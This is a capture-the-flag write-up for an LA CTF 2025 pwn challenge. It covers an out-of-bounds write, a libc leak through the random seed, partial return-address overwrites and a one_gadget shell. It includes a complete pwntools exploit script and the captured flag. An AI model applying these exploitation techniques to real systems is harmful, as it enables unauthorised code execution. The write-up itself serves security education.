# Write up LA CTF 2025
## PWN
### this-is-how-you-pwn-the-time-war
#### overview
```shell
pwndbg> checksec
File:     /home/thefless/Documents/LACTF/pwn-the-time-war/pwn_the_time_war_patched
Arch:     amd64
RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        PIE enabled
RUNPATH:    b'.'
Stripped:   No
pwndbg> 
```
- `No canary found`, `Partial RELRO`.
```c
int main(void) {
    init();
    run();
    return 0;
}
```
- `main` call `init` and `run`.
```c
void init() {
    setbuf(stdout, NULL);
    srand(clock_gettime);
}
```
- `init` use 32 low bits to set seed randome. that is address of `clock_gettime`.
```c
void run() {
    short code[4];
    for (int i = 0; i < 4; i ++) {
        code[i] = rand() % 16;
    }
    printf("You see a locked box. The dial on the lock reads: %d-%d-%d-%d\n", code[0], code[1], code[2], code[3]);
    printf("Which dial do you want to turn? ");
    short ind1, val1, ind2, val2;
    if (scanf("%hd", &ind1) <= 0) {
        return;
    }
    printf("What do you want to set it to? ");
    scanf("%hd", &val1);
    printf("Second dial to turn? ");
    scanf("%hd", &ind2);
    printf("What do you want to set it to? ");
    scanf("%hd", &val2);
    code[ind1] = val1;
    code[ind2] = val2;
    printf("The box remains locked.\n");
}
```
- `run` have oob bug.
#### exploit
```shell
thefless@thefless:~/Documents/LACTF/pwn-the-time-war$ one_gadget libc.so.6 
0x4c139 posix_spawn(rsp+0xc, "/bin/sh", 0, rbx, rsp+0x50, environ)
constraints:
  address rsp+0x60 is writable
  rsp & 0xf == 0
  rax == NULL || {"sh", rax, r12, NULL} is a valid argv
  rbx == NULL || (u16)[rbx] == NULL

0x4c140 posix_spawn(rsp+0xc, "/bin/sh", 0, rbx, rsp+0x50, environ)
constraints:
  address rsp+0x60 is writable
  rsp & 0xf == 0
  rcx == NULL || {rcx, rax, r12, NULL} is a valid argv
  rbx == NULL || (u16)[rbx] == NULL

0xd515f execve("/bin/sh", rbp-0x40, r13)
constraints:
  address rbp-0x38 is writable
  rdi == NULL || {"/bin/sh", rdi, NULL} is a valid argv
  [r13] == NULL || r13 == NULL || r13 is a valid envp
thefless@thefless:~/Documents/LACTF/pwn-the-time-war$
```
- I use one_gadget to get shell.
- I use `run` (in the first time) to set `(u16)[rbx] == NULL` partial overwrite to call run again. (probalbility 1/16).
- I know 12 low bits. I use 8 time random in `short code[4]` to bruteforce 20 bits left.
- I use `run` (in the second time) to overwrite return address of main function = one_gadget.
#### Proof of Concepts
```python
#!/usr/bin/python3
from pwn import *
from ctypes import CDLL

exe_path = "./pwn_the_time_war_patched"
libc_path = "./libc.so.6"

context.binary = exe = ELF(exe_path, checksec=False)
libc = ELF(libc_path, checksec=False)
context.arch = "amd64"
libc_native = CDLL(libc_path)

OFFSET_CLOCK_GETTIME = 0xcf420
OFFSET_ONE_GADGET = 0x4c139
LOW_12_BIT = OFFSET_CLOCK_GETTIME & 0xFFF

def solve():
    attempt = 0
    while True:
        attempt += 1
        try:
            # p = process(exe.path)
            p = remote("chall.lac.tf" , port = 31313)
            def sl(payload): p.sendline(payload)
            def ru(payload): return p.recvuntil(payload)
            def rln(): return p.recvline()
            
            def edit(idx1, val1, idx2, val2):
                ru(b'turn? ')
                sl(str(idx1).encode())
                ru(b'set it to? ')
                sl(str(val1).encode())
                ru(b'turn? ')
                sl(str(idx2).encode())
                ru(b'set it to? ')
                sl(str(val2).encode())

            ru(b'reads: ')
            line = rln().strip().decode()
            vals = [int(x) for x in line.split("-")]

            edit(10, (exe.sym.main + 14) & 0xFFFF, 154, 0)

            ru(b'reads: ')
            line = rln().strip().decode()
            vals += [int(x) for x in line.split("-")]
            
            found_seed = -1
            for i in range(0, 0x100000): 
                candidate_seed = (i << 12) | LOW_12_BIT
                libc_native.srand(candidate_seed)
                
                if (libc_native.rand() % 16 == vals[0] and
                    libc_native.rand() % 16 == vals[1] and
                    libc_native.rand() % 16 == vals[2] and
                    libc_native.rand() % 16 == vals[3] and
                    libc_native.rand() % 16 == vals[4] and
                    libc_native.rand() % 16 == vals[5] and
                    libc_native.rand() % 16 == vals[6] and
                    libc_native.rand() % 16 == vals[7]):
                    
                    found_seed = candidate_seed
                    break
            
            if found_seed == -1:
                p.close()
                continue

            libc_base_low = found_seed - OFFSET_CLOCK_GETTIME
            target_one_gadget = libc_base_low + OFFSET_ONE_GADGET
            
            edit(18, target_one_gadget & 0xFFFF, 19, (target_one_gadget >> 16) & 0xFFFF)

            p.clean(timeout=1)
            p.sendline(b"cat flag.txt")
            
            try:
                data = p.recv(timeout=3)
                if b"lactf" in data or b"{" in data:
                    print(f"\n[!] SUCCESS at attempt {attempt}!")
                    print(f"[+] Seed: {hex(found_seed)}")
                    print(f"[+] One Gadget: {hex(target_one_gadget)}")
                    p.interactive()
                    break
            except:
                pass
            
            p.close()

        except KeyboardInterrupt:
            print("\n[-] Aborted by user.")
            break
        except Exception:
            try: p.close()
            except: pass
            continue

if __name__ == "__main__":
    solve()

# lactf{pwn_challs_are_bits_in_binaries_cast_into_the_waves_of_time}
```